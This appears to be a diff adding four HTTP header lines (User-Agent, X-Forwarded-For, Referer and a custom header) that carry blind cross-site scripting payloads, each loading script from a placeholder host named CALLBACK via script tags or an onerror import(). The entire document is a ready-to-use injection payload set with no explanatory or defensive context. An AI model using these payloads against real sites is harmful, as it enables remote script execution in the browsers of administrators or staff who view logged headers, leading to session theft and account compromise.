@@ -1,0 +1,4 @@
+User-Agent: "><script src=https://CALLBACK></script>
+X-Forwarded-For: <script src=https://CALLBACK></script>
+Referer: https://CALLBACK
+X-Custom-Header: "><img src=x onerror=import('https://CALLBACK')>
